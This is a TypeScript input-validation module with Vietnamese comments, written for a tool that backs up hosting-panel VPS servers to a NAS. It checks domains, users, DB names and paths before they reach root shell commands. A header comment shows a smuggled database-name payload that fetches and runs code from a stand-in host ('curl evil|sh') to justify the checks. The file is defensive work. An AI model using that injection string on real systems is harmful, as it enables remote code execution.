import type { PanelType } from '@/types';

/**
 * Kiểm tra định danh lấy từ VPS (tên miền, user hệ thống, tên DB, webroot) hoặc từ API
 * trước khi đưa vào lệnh shell (root trên VPS / bash trên NAS) hay ghép đường dẫn trên NAS.
 *
 * Khách hàng hosting tự tạo được DB tên tùy ý trong prefix của họ, VD trên cPanel:
 *   CREATE DATABASE `cpuser_$(curl evil|sh)`
 * nên mọi giá trị này phải coi là KHÔNG tin cậy.
 */

export const VALID_PANEL_TYPES: ReadonlySet<string> = new Set<PanelType>([
  'DIRECTADMIN',
  'CPANEL',
  'PLESK',
  'AAPANEL',
  'CYBERPANEL',
  'HESTIACP',
  'CLOUDPANEL',
]);

// Nhãn tên miền chuẩn (bao gồm punycode xn--), không có "..", không bắt đầu bằng "-" hay "."
const DOMAIN_RE = /^[A-Za-z0-9](?:[A-Za-z0-9_-]*[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9_-]*[A-Za-z0-9])?)*$/;
// User Linux / SSH: chữ, số, ".", "_", "-"; độ dài 1..64; không bắt đầu bằng "-" hay "."
const SYSTEM_USER_RE = /^[A-Za-z0-9._-]{1,64}$/;
// Tên DB MySQL thực tế trên các panel: chữ, số, "_" và "-"; không bắt đầu bằng "-"
const DB_NAME_RE = /^[A-Za-z0-9_][A-Za-z0-9_-]{0,63}$/;
// IPv4 / IPv6 / hostname chuẩn an toàn cho tham số SSH & tên thư mục
const HOST_ADDRESS_RE = /^[A-Za-z0-9._:-]{1,253}$/;
// Tên thư mục snapshot chuẩn (VD: 2026-11-02_01-00 hoặc seed_base)
const SNAPSHOT_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/;
// Đường dẫn tuyệt đối POSIX, chỉ ký tự an toàn, không có segment "." / ".."
const POSIX_PATH_RE = /^\/[A-Za-z0-9._@+/-]*$/;

export function isValidPanelType(value: string): value is PanelType {
  return VALID_PANEL_TYPES.has(value);
}

export function isSafeDomain(value: string): boolean {
  return value.length <= 253 && DOMAIN_RE.test(value);
}

export function isSafeSystemUser(value: string): boolean {
  return (
    SYSTEM_USER_RE.test(value) &&
    !value.startsWith('-') &&
    !value.startsWith('.') &&
    !value.includes('..')
  );
}

export function isSafeDbName(value: string): boolean {
  return DB_NAME_RE.test(value);
}

export function isSafeHostAddress(value: string): boolean {
  return (
    HOST_ADDRESS_RE.test(value) &&
    !value.startsWith('-') &&
    !value.startsWith('.') &&
    !value.includes('..')
  );
}

export function isSafeSnapshotName(value: string): boolean {
  return SNAPSHOT_NAME_RE.test(value) && !value.includes('..');
}

export function isSafeWebroot(value: string, minSegments = 3): boolean {
  if (!POSIX_PATH_RE.test(value)) return false;
  const segments = value.split('/').filter(Boolean);
  if (segments.some((s) => s === '.' || s === '..')) return false;
  // Chặn "/", "/home", "/home/user"... để rsync --delete / chown -hR không quét cả hệ thống
  return segments.length >= minSegments;
}

/**
 * hostname được dùng cho cả định danh máy chủ và thư mục snapshot trên NAS:
 * chỉ chấp nhận ký tự host/IP an toàn, không bắt đầu bằng "-" hay ".", không chứa "..".
 */
export function isSafeServerLabel(value: string): boolean {
  return isSafeHostAddress(value);
}

/** Trả về thông báo lỗi tiếng Việt nếu trường kết nối máy chủ không hợp lệ, hoặc null. */
export function validateServerConnectionFields(fields: {
  hostname: string;
  ipAddress: string;
  sshUser: string;
  panelType?: string;
  sshPort?: number;
  bwLimitKbps?: number;
}): string | null {
  if (!isSafeServerLabel(fields.hostname)) {
    return 'Hostname không hợp lệ (chỉ gồm chữ, số, ".", "_", "-", ":", dài 1–253 ký tự, không bắt đầu bằng "-" hay "." và không chứa "..").';
  }
  if (!isSafeHostAddress(fields.ipAddress)) {
    return 'Địa chỉ IP / Hostname SSH không hợp lệ (chỉ gồm chữ, số, ".", "_", "-", ":" và không bắt đầu bằng "-").';
  }
  if (!isSafeSystemUser(fields.sshUser)) {
    return 'SSH User không hợp lệ (chỉ gồm chữ, số, "_", ".", "-", dài 1–64 ký tự và không bắt đầu bằng "-").';
  }
  if (fields.panelType !== undefined && !isValidPanelType(fields.panelType)) {
    return 'Loại Control Panel không hợp lệ (chỉ hỗ trợ DIRECTADMIN, CPANEL, PLESK, AAPANEL, CYBERPANEL, HESTIACP, CLOUDPANEL).';
  }
  if (
    fields.sshPort !== undefined &&
    (!Number.isInteger(fields.sshPort) || fields.sshPort < 1 || fields.sshPort > 65535)
  ) {
    return 'Cổng SSH (ssh_port) phải là số nguyên từ 1 đến 65535.';
  }
  if (
    fields.bwLimitKbps !== undefined &&
    (!Number.isInteger(fields.bwLimitKbps) ||
      fields.bwLimitKbps < 0 ||
      fields.bwLimitKbps > 100_000_000)
  ) {
    return 'Giới hạn băng thông (bw_limit_kbps) phải là số nguyên không âm (0 – 100.000.000 KB/s).';
  }
  return null;
}

export function assertSafe(
  check: (v: string) => boolean,
  value: string,
  label: string
): string {
  if (!check(value)) {
    throw new Error(`${label} không hợp lệ hoặc chứa ký tự nguy hiểm: ${JSON.stringify(value)}`);
  }
  return value;
}
